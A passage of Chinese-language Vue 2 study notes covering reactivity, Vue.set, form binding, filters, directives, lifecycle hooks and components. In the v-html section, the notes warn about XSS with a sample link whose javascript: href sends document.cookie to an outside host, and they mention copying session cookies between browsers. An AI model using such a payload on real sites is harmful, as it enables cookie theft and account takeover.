    <button @click="sortType=1">年龄降序</button>
    <button @click="sortType=0">原顺序</button>
    <ul>
        <li v-for="(item, index) of filPersons" :key="item.id">{{item.name}} - {{item.age}} - {{item.sex}}</li>
    </ul>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            name: '',
            sortType:0, // 0 原序， 1 降序， 2 升序
            persons: [
                {id: '001', name: '张三', age: 30, sex: '女'},
                {id: '002', name: '张四', age: 34, sex: '女'},
                {id: '003', name: '王四', age: 19, sex: '男'},
                {id: '004', name: '王五', age: 20, sex: '男'},
            ],
        },
        computed: {
            filPersons() {
                const arr = this.persons.filter(item => {
                    return item.name.indexOf(this.name) !== -1
                })
                if(this.sortType) {
                    arr.sort((item1, item2) => {
                        return this.sortType === 1 ? item2.age - item1.age : item1.age - item2.age
                    })
                }
                return arr

            }
        }
    })


</script>
</body>
</html>

```

## 1.15.`vue`监测数据改变的原理

### 1.15.1.数据更新时的问题

- 当数组中的对象作为一个整体被更新时，内存中的数据是改了，但是页面上并没有改，因为`vue`没有监测到

- 更改的写法：

  ```html
  <!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <title>Title</title>
      <script src="js/vue.js"></script>
      <style>
  
      </style>
  </head>
  <body>
  <div id="app">
      <h2>列表过滤</h2>
      <button @click="update">更改信息</button>
      <ul>
          <li v-for="(item, index) of persons" :key="item.id">{{item.name}} - {{item.age}} - {{item.sex}}</li>
      </ul>
  </div>
  
  <script>
      Vue.config.productionTip = false
  
      const vm = new Vue({
          el: '#app',
          data: {
              persons: [
                  {id: '001', name: '张三', age: 30, sex: '女'},
                  {id: '002', name: '张四', age: 34, sex: '女'},
                  {id: '003', name: '王四', age: 19, sex: '男'},
                  {id: '004', name: '王五', age: 20, sex: '男'},
              ],
          },
          methods: {
              update() {
                  this.persons[0].name = '赵六'
                  this.persons[0].age = '18'
                  this.persons[0].sex = '男'
              }
          }
      })
  
  
  </script>
  </body>
  </html>
  
  ```

- 无法更改的写法（直接用一整个对象去赋值）

  内存中的数据实际改了，但`vue`没有监测到，所以页面就没有变化

  ```html
          methods: {
              update() {
                  this.persons[0] = {name: '赵六', age: 18, sex: '男'}
              }
          }
  ```

  ![image-20220521110400917](image-20220521110400917.png)

### 1.15.2.`Vue`监测对象数据改变的原理

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
</head>
<body>
<div id="app">
    <h2>姓名：{{person.name}}</h2>
    <h2>年龄：{{person.age}}</h2>
</div>
<script>
    Vue.config.productionTip = false
    const vm = new Vue({
        el: '#app',
        data: {
            person: {
                name: 'sai',
                age: 18
            }
        },
    })
</script>
</body>
</html>
```



我们之前讲写`data`配置项后，通过数据代理，`vm`实例上的`_data`就代理了配置项`data`

但这个已经是第二步了

`vue`拿到配置项`data`的第一步，是先加工一下`data`：给`data`里的每一组键值，都设置了`getter/setter`函数

然后把加工后的`data`给了`_data`

那么为什么要加工呢？加工后就可以做响应式了（数据变了，页面也跟着变）

当后面修改`_data`里面的内容的时候，就会引起`name`所对应的`setter`调用，即`reactiveSetter`响应式`setter`，这个响应式`setter`里面肯定会调用一些方法：能够引起模板的重新解析，引起后续动作

打印输出一下`_data`：

![image-20220521111524338](image-20220521111524338.png)



自己实现：

- 更改数据后，会有人提示我，更改了

  - 创建一个监视的实例对象，用于监视`data`中属性的变化
  - 汇总对象中所有的属性，形成一个数组
  - 遍历每一个`key`，在监视的实力对象上，为每个`key`添加`getter/setter`（数据代理）

  ```js
      let data = {
          name: 'sai',
          age: 18
      }
      
      function Observer(obj) {
          // 汇总对象中所有的属性，形成一个数组
          const keys = Object.keys(obj)
          //遍历添加`getter/setter`
          keys.forEach(k => {
              Object.defineProperty(this, k, {
                  get() {
                      return obj[k]
                  },
                  set(val) {
                      obj[k] = val
                  }
              })
          })
      }
  	// 创建一个监视的实例对象，用于监视`data`中属性的变化
      const obs = new Observer(data)
      console.log(obs)
  ```

  - 准备一个`vm`对象，将`obs`赋值给该对象的`_data`属性

    ```js
    
        let data = {
            name: 'sai',
            age: 18
        }
        function Observer(obj) {
            const keys = Object.keys(obj)
            keys.forEach(k => {
                Object.defineProperty(this, k, {
                    get() {
                        return obj[k]
                    },
                    set(val) {
                        obj[k] = val
                        console.log(`${k}被修改了，接下来去解析模板，生成虚拟dom`)
                    }
                })
            })
        }
        const obs = new Observer(data)
        console.log(obs)
        const vm = {}
        vm._data = data = obs
        console.log(vm)
    ```

    ![image-20220522112843100](image-20220522112843100.png)

  - 我们要修改属性，必须通过`_data`来修改，`vue`可以直接修改，这是比我们完善的地方；并且我们没有考虑，对象里面嵌套对象、数据是数组的情况



### 1.15.3.`Vue.set()`方法

后添加的数据，也能实现响应式：

- `Vue.set(vm._data.student, 'sex', '男')`
- `vm.$set(vm._data.student, 'sex', '男')`

在`Vue`中，`vm._data.student === vm.student`

- `Vue.set(vm.student, 'sex', '男')`
- `vm.$set(vm.student, 'sex', '男')`



局限：不能给`Vue`实例的`data`追加属性，只能给`data`里面的某一个对象追加属性

即`vm.$set(vm._data, 'sex', '男')`是错误的：

### 1.15.4.`Vue`检测数组数据改变的原理

对于数组类型的数据，是没有为`索引`服务的`setter/getter`的，所以通过索引值修改数组对象，`Vue`是不能实现响应式的

![image-20220522121829731](image-20220522121829731.png)

修改数据后，页面并没有重新解析，因为`vue`没有监视到

那么用户修改数组数据时，怎么知道修改了呢？

- 退一步思考，修改数据的方法有哪些呢？

  - `push`、`pop`、`shift`、`unshift`、`splice`、`sort`、`reverse`

- `vue`重写了上述方法，在修改数组调用上述方法时，就可以监测到数组改变了

  ![image-20220522132359746](image-20220522132359746.png)

那么`vue`是怎么监测的到，用户调用了`push`方法呢？

用户调用的`push`已经不是原生的`push`方法了，是经过`vue`包装过的了

- 正常数组的的`push`是`Array`原型对象上的`push`：`arr.push === Arrar.prototype.push`

- `vue`中管理的数组上的`push`不是原生的`push`，还做了其他的事情

  - 先调用原生的`push`
  - 再重新渲染模板，生成虚拟`dom`

  ![image-20220522133102245](image-20220522133102245.png)



`Vue`通过包装数组身上的常用修改数组的方法，实现数组的监测

对于数组数据，也可以通过`Vue.set()`或`vm.$set()`来设置响应式

如果是数组

```vue
optionsAllCounter: {
        color: ["#3398DB"],
        tooltip: {
          trigger: "axis",
          axisPointer: {
            // 坐标轴指示器，坐标轴触发有效
            type: "shadow", // 默认为直线，可选为：'line' | 'shadow'
          },
        },
        grid: {
          left: "3%",
          right: "4%",
          bottom: "3%",
          containLabel: true,
        },
        xAxis: [
          {
            type: "category",
            // data: [
            //   "Mon",

            // ],
            axisTick: {
              alignWithLabel: true,
            },
          },
        ],
        yAxis: [
          {
            type: "value",
            axisLabel: {
              formatter: "{value} 条",
              //   align: "center",
            },
          },
        ],
        series: [
          {
            name: "数量",
            type: "bar",
            barWidth: "60%",
            // data: [
            //   10, 
            // ],
          },
        ],
      },
    };

// ...
this.$set(this.optionsAllCounter.xAxis[0], 'data', xAxisData)
this.$set(this.optionsAllCounter.series[0], 'data', seriesData)
```



### 1.15.5.小结：`Vue`监视数据

- `vue`会监视`data`中所有层次的数据
- 如何监视对象中的数据
  - 通过`getter`实现监视，并且要在`new Vue`时就传入要监视的数据
    - 对象中后追加的属性，`vue`默认不做响应式处理
    - 如需给后添加的属性做响应式，请使用如下`api`:
      - `Vue.set(target, propertyName/index, value)`或
      - `vm.$set(target, propertyName/index, value)`
- 如何监测数组中的数据
  - 通过包裹数组更新元素的方法实现，本质就是做了两件事
    - 调用原生对应的方法对数组进行更新
    - 重新解析模板，进而更新页面
- 在`vue`中修改数组的某个元素，一定要用如下方法：
  - 使用这些`API`：`push()`、`pop()`、`shift()`、`unshift()`、`splice()`、`sort()`、`reverse()`
  - `Vue.set()`或`$vm.$set()`
    - 特别注意：不能给`vm`或`vm`的根数据对象添加属性
- 数据劫持
  - 把传入的`data`都遍历一遍变成`getter/setter`形式的这种操作，叫做`数据劫持`



## 1.16.收集表单数据

### 1.16.1.不同类型的输入框

`v-mode`配合不同`input`时，会有不同的技巧

- 最基础的输入框:输入的值，就是`value`值

  ```html
        账号：<input type="text" v-model="account"><br>
        密码：<input type="password" v-model="password"><br>
  ```

- 单选框：要配置`value`，并且要有一个`String`类型的变量，存储选中的`value`值

  ```html
          性别：
          男 <input type="radio" name="sex" v-model="sex" value="male"> 
  		女 <input type="radio" name="sex" v-model="sex" value="female"><br>
  ```

- 复选框：要配置`value`，并且要有一个`Array`类型的变量，存储选中的`value`值；如果不配置`value`，该变量存储的是`checked`的布尔状态

  ```html
          爱好：
          学习 <input type="checkbox" v-model="hobby" value="study">
          吃饭 <input type="checkbox" v-model="hobby" value="eating">
          打游戏 <input type="checkbox" v-model="hobby" value="game"><br>
  ```

- 选择框：内层多个`option`要配置`value`，并且最外层要有一个`String`类型的变量，存储选中的`value`值

  ```html
         所属校区：
          <select v-mode="city">
              <option value="">请选择校区</option>
              <option value="beijing">北京</option>
              <option value="shanghai">上海</option>
              <option value="shenzhen">深圳</option>
          </select><br>
  ```

- 确认框：配置`value`，并且要有一个`String`类型的变量

  ```html
          <input type="checkbox" v-model="agree">阅读并接受协议<a href="#">《用户协议》</a>
  ```

- 给最外层的表单，添加`submit`事件，并阻止其默认行为，在其回调函数中发送`ajax`请求

  ```html
      <form @submit.prevent="submit">
  		...
  	</form>
  ```

  由于要收集这些数据，一般在定义`data`时，会将表单中需要绑定数据定义在一个大的对象中

  可以用`JSON.stringify(this.userInfo)`将收集到的数据，转化成`json`格式

  

- 数字类型的输入值，进行类型控制

  - 原生的使用`type = "number"`，控制用户只能输入数字

  - `v-model`

    - 修饰符`number`：控制收集到的数据是`Number`类型，而不是`String`类型，如果只是用`number`修饰符，那么输入`3a23`这种混合值时，只会收集到`3`，第一次遇到字符串`a`会停止收集（前台输入也没用）

      ```html
      		年龄 <input type="number" v-model.number="age"><br>
      ```

    - 修饰符`lazy`：输入框失去焦点时，再收集数据
    - 修饰符`trim`：收集数据时，会去除输入值的前后空格（中间的空格不会去除）



### 1.16.2.小结：收集表单数据

- 若`<input type="text"/>`，则`v-model`收集的是`value`值，用户输入的就是`value`值
- 若`<input type="radio"/>`，则`v-model`收集的是`value`值，且要给标签配置`value`值
- 若`<input type="checkbox"/>`
  - 没有配置`input`的`value`属性，那么收集的就是`checked`（勾选 / 未勾选，是布尔值）
  - 配置了`input`的`value`属性：
    - `v-model`的初始值是非数组，那么收集的就是`checked`（勾选 / 未勾选，是布尔值）
    - `v-model`的初始值是数组，那么收集的就是`value`组成的数组
- 备注：`v-model`的三个修饰符
  - `lazy`：失去焦点再收集数据
  - `number`：输入的字符串转为有效的数字
  - `trim`：输入首尾空格过滤

## 1.17.过滤器

### 1.17.1.过滤器的基本使用

功能：对要显示的数据进行特定格式化后再显示

注意：并没有改变原本的数据，是产生新的对应的数据



过滤器的本质就是一个函数，将过滤器符号前的变量`time`作为默认参数传给`timeFormater`，然后用`timeFormater`的返回值，替换整个差值语法实现解析

```html
<h3>
    时间：{{ time | timeFormater}}
</h3>
```



```js
	data() {},
    filters: {
        // 过滤器可以对数据进行加工
        timeFormater(value) {
            
        }
    }
```

### 1.17.2.过滤器传参

当`timeFormater`有参数时，如`{{ time | timeFormater('YYYY_MM_DD') }}`，其默认的第一个参数始终是管道符前的变量

```html
<h3>
    时间：{{ time | timeFormater('YYYY_MM_DD')}}
</h3>
```



```js
    filters: {
        timeFormater(value, str) {
            
        }
    }
```

并且`es6`语法支持设置函数参数的默认值

```js
    filters: {
        timeFormater(value, str = 'YYYY年MM月DD日 HH:mm:ss') {
            
        }
    }
```



### 1.17.3.过滤器串联

类似于管道符，可以串联多个过滤器

```html
<h3>
    时间：{{ time | timeFormater('YYYY_MM_DD') | mySlice}}
</h3>
```



备注：定义在配置对象中的过滤器，属于局部过滤器

### 1.17.4.全局过滤器

假设有两个`vm`实例，可以定义全局过滤器实现复用

```
Vue.filter('mySlice', function(value) {
	return value.slice(0, 4)
})
```



过滤器除了应用在差值语法上，在单向数据动态绑定时，也可以使用

```html
<h2 :x = "address | mySlice">
    地址
</h2>
```



### 1.17.8.小结：过滤器

- 定义：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）
- 语法：
  - 注册过滤器
    - `Vue.filter(name, callback)`或
    - `new Vue(filters: {})`
  - 使用过滤器
    - `{{ xxx | 过滤器名 }}`或
    - `v-bind:属性 = "xxx | 过滤器名"`
- 备注：
  - 过滤器也可以接收额外参数，多个过滤器也可以串联
  - 并没有改变原本的数据，是产生新的对应的数据



## 1.18.内置指令

### 1.18.1.学过的指令

- `v-bind`：单向绑定解析表达式，可简写成`:xxx`
- `v-model`：双向数据绑定
- `v-for`：遍历数组/对象/字符串
- `v-on`：绑定事件监听，可简写成`@`
- `v-if`：条件渲染（动态控制节点是否存在）
- `v-else`：条件渲染（动态控制节点是否存在）
- `v-show`：条件渲染（动态控制节点是否展示）

### 1.18.2.`v-text`

```html
    <div v-text="name">你好</div>
```



```js
        data: {
            name: '<h3>sai</h3>',
        }
```

`v-text`会把所有的字符串都解析在页面上（即使包含了`html`标签），并且会覆盖原来节点里的内容

![image-20220522190522128](image-20220522190522128.png)

- 作用：向其所在节点中渲染文本内容
- 与差值语法的区别：`v-text`会替换掉文本内容，而差值语法不会

### 1.18.3.`v-html`

```html
    <div v-html="name">你好</div>
```



```js
        data: {
            name: '<h3>sai</h3>',
        }
```

`v-html`会解析字符串里的`html`标签

![image-20220522190306943](image-20220522190306943.png)

`cookie`

- 工作原理简易图示

  ![image-20220523070301284](image-20220523070301284.png)

  可以通过`document.cookie`获取用户本地的`cookie`，如果被`httponly`限制了，则该方式获取不到

  手动演示，在谷歌浏览器上登录`github`后，使用插件粘贴在火狐浏览器上，火狐浏览器也登录了

- `v-html`风险

  ```html
      <div v-html="str">点我获取资源</div>
  
  ```

  ```js
          data: {
              str: '<a href=javascript:location.href="http://www.baidu.com? + document.cookie">有资源！！快点我！！</a>',
          },
  ```

  如果使用不当，会导致`xss`攻击

小结：`v-html`

- 作用：向指定节点中渲染包含`html`结构的内容
- 与差值语法的区别
  - `v-html`会替换掉节点中所有的内容，差值语法则不会
  - `v-html`可以识别`html`结构
- 严重注意，使用`v-html`要注意安全性问题
  - 在网站上动态渲染任意`HTML`是非常危险的，容易导致`xss`攻击
  - 一定要在可信内容上，使用`v-html`，永远不要再用户提交的内容上使用

### 1.18.4.`v-cloak`

如果`vue.js`延迟加载了，页面上会出现很多插值语法，为了隐藏这些插值语法使用`v-cloak`属性，并给该配置添加`css`属性

```css
[v-cloak] {
    display: none
}
```



```html
<h2 v-cloak>
    {{name}}
</h2>
```

`vue`实例接管容器的一瞬间，会将`v-cloak`属性删除，此时页面就会正常显示。

解决的问题：当网速过慢时，可以不让未经解析的模板跑到页面上

### 1.18.5.`v-once`

只会加载一次变量的值

```html
<h2 v-once>
    初始值是：{{name}}
</h2>
```

使用`v-once`修饰符的插值语法，只会解析一次



小结：

- `v-once`所在节点在初次动态渲染后，就视为静态内容了
- 以后数据的改变，不会引起`v-once`所在结构的更新，可以用于优化性能

### 1.18.6.`v-pre`

- 跳过其所在节点的编译过程
- 可利用它跳过：没有使用指令语法，没有使用插值语法的节点，会加快编译

## 1.19.自定义指令

需求1：定义一个`v-big`指令，和`v-text`功能类似，但会把绑定的数值放大10倍

需求2：定义一个`v-fbind`指令，和`v-bind`功能类似，但可以让其所绑定的`input`元素默认获取焦点

### 1.19.1.函数形式

使用`directives`配置项实现自定义指令

- 函数形式

  ```js
  directives: {
      big: function(element, binding) {
          
      },
      
      // 简写
      big(element, binding) {
          console.dir(element)
      	console.log(element, element instanceof HTMLElement)
          console.log(binding)
      }
  }
  ```

  - 形参`element`是拿到的真实`dom`，可以用`console.dir()`方法打印查看，或`element instanceof HTMLElement来判断`

    ![image-20220523164101003](image-20220523164101003.png)

  - 形参`binding`是`vue`提供的绑定对象，其具体属性如下：

    ![image-20220523172724160](image-20220523172724160.png)

  - 操作真实的`dom`元素:

    ```html
        <h2>当前的n值为：<span v-text="n"></span></h2>
        <h2>放大10倍后的n值为：<span v-big="n"></span></h2>
        <button @click="n++">n+1</button>
    ```

    

    ```js
            directives: {
                big(element, binding) {
                    element.innerText = binding.value * 10
                }
            }
    ```

    ![image-20220523191342634](image-20220523191342634.png)

    

    `big`函数的调用时机：

    - 指令和元素成功绑定时（初始化）
      - 此时模板还没有被解析成真实`dom`
    - 指令所在的模板，被重新解析时
      - 可能是其他数据发生了改变，引起了模板重新解析
    - 缺点：
      - 无法在模板被解析成真实`dom`时被调用

### 1.19.2.对象形式

- 对象形式

  - 要实现需求二，注意`focus()`方法要在元素被插入页面时调用

  ```js
  directives: {
  	fbind: {
          // 指令和元素成功绑定时（一上来）
          bind(element, binding) {
              console.log('bind')
              element.value = binding.value
          },
          // 指令所在元素被插入页面时
          inserted(element, binding) {
              console.log('inserted')
              element.focus()
          },
          // 指令所在的模板被重新解析时
          update(element, binding) {
              console.log('update')
              element.value = binding.value
          }
      }
  }
  ```

- 很多时候，`bind()`和`update()`函数，其内容是一样的，所以`vue`提供了函数的写法，相当于调用了`bind()`和`update()`，这三个函数其实就是回调函数，`vue`会在不同的时候帮我们调用这些函数

### 1.19.3.小结：自定义指定

- 定义语法

  - 局部指令

    ```js
    new Vue({
        directives: {
            指令名： 函数
        }
    })
    ```

    或者

    ```js
    new Vue({
        directives: {
            指令名：{ // 配置对象
            	//三个时机的回调函数
            	bind() {},
            	inserted() {},
        		update() {}
        	}
        }
    })
    ```

  - 全局指令

    ```js
    Vue.directive(指令名, 回调函数)
    ```

    或者

    ```js
    Vue.directive(指令名, { //第二个参数为配置对象
        //三个时机的回调函数
        bind() {},
        inserted() {},
        update() {}
    })
    ```

- 配置对象中，常用的三个回调

  - `bind`：指令与元素成功绑定时的回调
  - `inserted`：指令所在元素被插入到页面时调用
  - `update`：指令所在模板结构被重新解析时调用

- 备注：

  - 指令定义时不用加`v-`，但使用时需要加`v-`
  - 指令名如果是多个单词，要使用`kebab-case`命名方式`(user-name)`，不要使用`camelCase`命名方式`(userName)`

## 1.20.生命周期

### 1.20.1.引出生命周期

想要页面加载完时，执行一个渐变操作，该如何实现？



真实开发时，一般不会用变量接收`vm`实例，更不会操作`vm`实例

`mounted()`调用时机

- `Vue`完成模板的解析，并把初始的真实的`dom`元素放入页面后（完成挂载），调用`mounted` 
- 只会调用一次
- 所谓的生命周期，就是一个函数，`vue`会在特定的时机帮你调用特定的函数



小结：

- 生命周期，又叫生命周期回调函数、生命周期钩子函数
- 是什么：`vue`在关键时刻帮我们调用的一些特殊名称的函数
- 生命周期函数的名字不可更改，但函数的具体内容是程序员根据需求编写的
- 生命周期中的`this`指向的是`vm`或组件实例对象



### 1.20.2.生命周期挂载流程

![image-20220524063122391](image-20220524063122391.png)

- `new VUe()`

  - 创建`Vue`实例

- `init Event & Lifecycle`（知道一下，干预不了）

  - 初始化：生命周期、事件，但数据代理还未开始

    - 如定义好生命周期函数有哪些、什么时候调用
    - 如遇到了事件的`once`修饰符，应该怎么处理

    - 此时`Vue`实例上还没有`_data`

- `beforeCreate`（生命周期函数）

  - 初始化生命周期、事件之后，会立刻调用`beforeCreate`生命周期函数

    - `before`表示，在数据监测和数据代理之前

  - 此时，无法通过`vm`访问到`data`中的数据、`methods`中的方法

    - 我们在`beforeCreate`函数中，打印`vm`实例，并设置断点查看：

      ```js
                  console.log('beforeCreate')
                  console.log(this)
                  debugger
      ```

      可以看到，此时`vm`身上并没有`_data`

      ![image-20220524065609916](image-20220524065609916.png)

    - 可以利用断点，进行调用堆栈及本地作用域分析

- `init injections & reactivity`

  - 初始化：数据监测、数据代理
  - 监测对象变化、监测数组变化

  - 一旦完成了上述操作，调用`created`回调函数

- `created`（生命周期函数）

  - 在数据监测和数据代理创建完毕后调用

  - 此时，可以通过`vm`访问`data`中的数据、`method`中配置的方法

    ```js
            created() {
                console.log('created', this)
                debugger
            },
    ```

    ![image-20220524101817856](image-20220524101817856.png)

- 判断配置项中是否有`el`配置项。此阶段`Vue`开始解析模板，生成虚拟`dom`（内存中），页面还不能显示解析好的内容（显示的是模板）

  - `Yes`：判断`temmplate`配置项

  - `No`：`when vm.$mounted(el) is called`，如果没有配置`el`，则会去调用`mounted`

    - 备注：如果没写`el`，也没有调`vm.$mounted`，则到这一步就不会继续进行了，即不会解析模板，只会执行`beforeCreate`和`created`两个生命周期函数

    - 判断是否有`template`配置项
      - `Yes`：`Compile template into render function`，把`template`配置项编译到`render`函数中

        - 容器里面可以什么都不写，使用`template`配置项

          ```js
          template: `
          	<div>
          		<h2>Hello World</h2>
          	</div>
          `
          ```

          会用`template`值，完全替换调根节点

      - `No`：`Compiler el's outHTML as template`，编译`el`外部`HTML`（包含选择器的那个元素）整体作为模板（可以在该节点上单向绑定验证一下是否被渲染）

- `beforeMount`（生命周期函数）

  - 此时页面呈现的是，未经`Vue`编译的`dom`结构

    ```js
            beforeMount() {
                console.log(this)
                debugger
            },
    ```

    ![image-20220524190708042](image-20220524190708042.png)

  - 所有对`dom`的操作，最终都不奏效

    - 因为再怎么修改，下一步会把已经定义好的虚拟`dom`转为真实`dom`，并插入页面

- `Create vm.$el and replace 'el' with it`：在`vm`身上创建`$el`选项并且用它替换掉整个`el`容器里的东西
  - 将内存中的虚拟`dom`转为真实`dom`插入页面
  
  - 转为真实`dom`后，在`vm.$el`上将真实`dom`存了一份
  
    ```js
            mounted() {
                console.log(this.$el)
                console.log(this.$el instanceof HTMLElement)
            },
    ```
  
    ![image-20220525062359038](image-20220525062359038.png)
  
- `mounted`

  - 此时页面中呈现的是经过`vue`编译的`dom`

    ![image-20220524191003284](image-20220524191003284.png)

  - 对`dom`的操作均有效（尽可能避免）

  - 至此初始化过程结束，一般在此进行：

    - 开启定时器
    - 发送网络请求
    - 订阅消息
    - 绑定自定义事件
    - 等其他初始化操作



### 1.20.3.生命周期更新流程

- 当数据改变时

  - `beforeUpdate`（生命周期函数）

    - 更改数据之前

    - 此时，数据是新的，但是页面是就旧的。即：页面尚未和数据保持同步

      ```js
              beforeUpdate() {
                  console.log(this.n)
                  debugger
              },
      ```

      

      ![image-20220525063143539](image-20220525063143539.png)

  - `Virtual DOM re-render and patch`

    - 根据新数据，生成新的虚拟`DOM`，随后与旧的虚拟`DOM`进行比较，最终完成页面更新。即：完成了`Model ==> View`的更新

  - `updated`（生命周期函数）

    - 此时，数据是新的，页面也是新的。即：页面和数据保持同步

      ```js
              updated() {
                  console.log(this.n)
                  debugger
              },
      ```

      ![image-20220525063559008](image-20220525063559008.png)



### 1.20.4.生命周期销毁流程

- 当调用`vm.$destroy()`时：完全销毁一个实例，清理它与其他实例的连接，解绑它的全部指令及事件监听器（移出的是自定义事件，而不是原生的`dom`事件）
  - `beforeDestroy`（生命周期函数）
    - 此时：`vm`中所有的`data`、`methods`、指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段关闭定时器、取消订阅消息、解绑自定义事件等收尾操作
    - 对数据进行的所有操作，都不会再触发更新
  - `TearDown watches, child components and event listeners`
    - 移出监视、组件和自定义事件监听器
  - `destoryed`

### 1.20.5.小结：生命周期

- 常用的生命周期钩子
  - `mounted`：发送`ajax`请求、启动定时器、绑定自定义事件、订阅消息等**初始化操作**
  - `beforeDestroy`：清除定时器、解绑自定义事件、取消订阅消息等**收尾操作**
- 关于销毁`Vue`实例
  - 销毁后借助`Vue`开发者工具看不到任何信息
  - 销毁后自定义事件会失效，但原生`DOM`事件依然有效
  - 一般不会在`beforeDestroy`中操作数据，因为即使操作数据，也不会再触发更新流程了

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="app">
    <h2 :style="{opacity}">Hello World</h2>
    <button @click="opacity=1">设置透明度为1</button>
    <button @click="stop">点击停止变换</button>
</div>

<script>
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#app',
        data: {
            n: 1,
            name: 'sai',
            opacity: 1
        },

        methods: {
            stop() {
                this.$destroy()
            },
        },
        mounted() {
            console.log('mounted', this)
            this.timer = setInterval(() => {
                console.log('setInterval')
                this.opacity -= 0.01
                if(this.opacity <= 0 ) this.opacity = 1
            }, 16)
        },
        beforeDestroy() {
            console.log('vm即将销毁')
            clearInterval(this.timer)
        }

    })


</script>
</body>
</html>

```

# 2.`Vue`组件化编程

## 2.1.模块与组件、模块化与组件化

### 2.1.1.模块

- 理解：向外提供特定功能的`js`程序，一般就是一个`js`文件
- 为什么要使用模块：`js`文件很多很杂
  - 从编程者文件构建梳理，文件的角度
- 使用模块的作用：简化`js`的编写，提高`js`运行效率

### 2.1.2.组件

- 理解：用来实现局部（特定）功能效果的代码集合（`html/css/js/images/...`）
  - 就是功能集合
- 为什么要使用组件：一个界面的功能很复杂
  - 从应用界面构建，代码的角度
- 作用：复用编码，简化项目编码编码，提高运行效率



传统方式编写应用，一个`html`页面会对应很多`css`和`js`文件，并且如果不同的页面，有相同的地方，唯一能做的就是`复制/粘贴`代码或文件，存在的问题：1.每个页面的依赖关系混乱，不好维护。2.代码复用率不高

![image-20220525160941885](image-20220525160941885.png)

模块化就是为了解决上述问题的。



使用组件方式编写应用：

![image-20220525161213001](image-20220525161213001.png)



所有的组件，必须听一个大哥`vm`的指挥

![image-20220525161829412](image-20220525161829412.png)

组件的定义：实现应用中**局部**功能**代码**和**资源**的**集合**

### 2.1.3.模块化

当应用中的`js`都以模块来编写的，那么这个应用就是一个模块化应用

### 2.1.4.组件化

当应用中的功能都是多组件方式来编写的，那么这个应用就是一个组件化应用

## 2.2.非单文件组件

### 2.2.1.局部组件

- 会用`Vue.extend()`方法创建组件，并传入一个配置对象

- 该配置对象都是用来控制组件中的内容的

  - 这个配置项，和之前的实例化的配置对象，几乎是一样的
  - 组件定义时，不能配置`el`，因为只能有一个大哥`vm`，最终所有的组件都要被一个`vm`管理，由`vm`决定服务于哪个容器
  - `data`配置项，需要写成一个函数，函数里面返回配置对象，保证数据隔离

- 第一步：创建组件

  ```js
  const school = Vue.extend({
      data() {
          return {
              name: 'test'
          }
      }
  })
  
  const student = Vue.extend({
      data() {
          return {
              name: 'student'
          }
      }
  })
  ```

- 第二步：注册组件

  在`vm`的`options`中，新增`components`配置对象（局部注册）

  ```js
  new Vue({
  	el: "#root",
  	components: {
  		school,
          student
  	}
  })
  ```

  我们分析生命周期流程时候，如果没有`el`配置项，则会去找`template`配置项，对于组件我们可以配置`template`作为模板

  ```js
  const school = Vue.extend({
      template: `
      	<div>
      		学校姓名：{{name}}
      	</div>
      `,
      data() {
          return {
              name: 'test'
          }
      }
  })
  
  const student = Vue.extend({
      template: `
      	<div>
      		学生姓名：{{name}}
      	</div>
      `,
      data() {
          return {
              name: 'student'
          }
      }
  })
  ```

- 第三步：使用组件

  编写组件标签

  ```html
  <div id="root">
      <school></school>
      <student></student>
  </div>
  ```



### 2.2.2.全局组件

第一步，还是先定义`hello`

第二步：使用`Vue.component()`注册全局组件

```js
Vue.component('hello', hello)
```

第三步，此时可以直接在多个`vm`编写组件标签

### 2.2.3.小结：非单文件组件

- `Vue`中使用组件的三大步骤
  - 一、定义组件（创建组件）
    - 编写`template`配置项
  - 二、注册组件
    - 局部注册：使用`vm`的`components`配置项
    - 全局注册：使用`Vue.component()`方法
  - 三、使用组件
    - 根模板中，编写组件标签
- 如何定义组件？
  - 使用`Vue.extend(options)`创建，其中`options`和`new Vue(options)`时传入的配置对象基本一致，但也有区别，区别如下：
    - `el`不用写
      - 因为最终所有的组件都要经过一个`vm`的管理，由`vm`中的`el`决定服务哪个容器
    - `data`必须写成函数
      - 避免组件被复用时，数据存在引用关系
  - 使用`template`可以配置组件结构
- 如何注册组件？
  - 局部注册：`new Vue`时传入`components`配置项
  - 全局注册：使用`Vue.component('组件名', 组件)`方法
- 如何使用组件？
  - 编写组件标签：`<school></school>`

### 2.2.4.使用组件的几个注意点

注册组件时，

- 如果组件名是一个单词
  - 如果是小写的，组件标签也是小写
  - 如果组件名是大写的，组件标签也是大写，建议大写，和开发者工具对应

- 如果组件名是多个单词
  - 组件名若是`my-school`，组件标签写成`<my-school></my-school>`
  - 组件名若是`MySchool`，组件标签写成`<MySchool></MySchool>`
    - 如果不是用的脚手架，则会报错
    - 用脚手架的话，建议这种写法



小结：

- 关于组件名

  - 一个单词组成
    - 第一种写法（首字母小写）：`school`
    - 第二种写法（首字母大写）：`School`
  - 多个单词组成
    - 第一种写法（`kebab-case`命名）：`my-school`
    - 第二种写法（`CamelCase`命名）：`MySchool`，需要`vue-cli`支持
  - 备注：
    - 组件名尽可能回避`HTML`中已有元素的名称，如`h2`、`H2`都不行
    - 定义组件时，可以使用`name`配置项指定组件在开发者工具中呈现的名字
      - 一般第三方组件库会这么做
      - 大型项目开发时，避免组件错乱

- 关于组件标签

  - 第一种写法：`<school></school>`
  - 第二种写法：`<school/>`
  - 备注：没有用脚手架时，第二种写法`<school/>`会导致后续组件不能被渲染

- 定义组件的简写方式：

      ```js
      const school = Vue.extend(options)
      
      // 简写
      const shool = options
      ```

  - 注册组件时，底层做了一个判断，如果`components`传入的是一个对象，会帮我们调用`Vue.extend()`的

### 2.2.5.组件的嵌套

标准化开发时，`vm`下应该要有一个`app`组件，类似丞相的角色，并且可以将`app`组件标签的调用，写在`vm`的`template`配置项中，使得容器中没有任何代码

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="js/vue.js"></script>
    <style>

    </style>
</head>
<body>
<div id="root">

</div>

<script>
    Vue.config.productionTip = false
    const student = Vue.extend({
        data() {
            return {
                name: 'student'
